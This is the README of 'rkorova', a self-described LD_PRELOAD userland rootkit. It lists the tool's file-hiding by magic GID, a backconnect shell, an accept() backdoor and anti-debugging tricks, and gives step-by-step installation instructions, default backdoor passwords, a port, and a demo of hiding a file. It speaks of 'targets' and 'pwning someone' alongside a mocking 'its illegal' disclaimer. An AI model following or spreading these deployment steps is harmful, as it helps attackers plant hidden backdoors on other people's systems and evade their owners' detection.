# rkorova

shitty LD_PRELOAD userland rootkit 

### Features
* (some) anti-debugging - strings are xor'ed out and rkorova cleans up after itself. rkorova also breaks ptrace with a HILARIOUS message of your choice! 
* hides files and directories through username and magic GID  
* shitty plaintext backconnect shell 
* accept() backdoor [plaintext only, working on crypto]

```
 ______     __  __     ______     ______     ______     __   __   ______    
/\  == \   /\ \/ /    /\  __ \   /\  == \   /\  __ \   /\ \ / /  /\  __ \   
\ \  __<   \ \  _"-.  \ \ \/\ \  \ \  __<   \ \ \/\ \  \ \ \'/   \ \  __ \  
 \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_____\  \ \__|    \ \_\ \_\ 
  \/_/ /_/   \/_/\/_/   \/_____/   \/_/ /_/   \/_____/   \/_/      \/_/\/_/ 
                                                                          
```
### Installation
* step 1: change default values (important!!)
* step 2: run compile.sh to compile 
* step 3: create magic user 
* step 4: replace ld_preload with librkorova.so 
* step 5: hide any other files not owned by you with chgrp (magic gid) (file) 
* step 6: ?????
* step 7: be eleet and brag about pwning someone on irc 

rkorova will (ideally) hide any files that are under the magic GID and/or the hidden user. in fact, you don't even need a user as long as you hide all files under the GID

### Upcoming features
* complete anti-debugging features 
* ~accept() backdoor~
* log sanitization
* antidetection 
* pam (pluggable authentication modules) backdoor
* network hiding 
* kernel module?

### Default values: 
* MAGIC = "mochi"
* MAGICGID = 1337 
* EXECPW = installgentoo
* SHELLPW = bl1ng
* PROC = /proc
* DEFAULT_PORT = 61040
* IP = 127.0.0.1
* XOR key = 0x2A  

Change these values lol 

### Hiding files example 
```
[razzledazzle@box hidden] touch mike_virus_grsec.txt 
[razzledazzle@box hidden] ls 
mike_virus_grsec.txt 
[razzledazzle@box hidden] sudo chgrp 1337 mike_virus_grsec.txt 
[razzledazzle@box hidden] ls

```

### Known issues 
* ~~stat segfaults whenever it attempts to display gid~~ - ~~sorta fixed, but now it doesn't say the file is hidden~~ - fixed. 
* ~~CLEAN macro is used inconsistently, which leads to MAGIC leaking - i know, will totally fix within the next 2 weeks~~ - fixed. 
* bash autocomplete shows hidden files
* vim segfaults - this is a weird one, probably has something to do with how i wrote open(). in the meantime, tell ur targets to use nano.
* ~~file command states hidden files as "empty", not "nonexistent" - should be fixed as of May 8 2018, but probably won't work until i find the root cause of the problem~~ fixed. stat() hook was done incorrectly.

### Uses 
 
dont use this for anything  
its illegal

#### FAQ

**your code is absolute garbage, you put brackets on newlines how are you allowed to live?**  
sorry  

**someone killed me in roblox, how do i use rkorova to hack him and steal his credit card?**  
ask on leakforums  

**ur gay**  
no u   
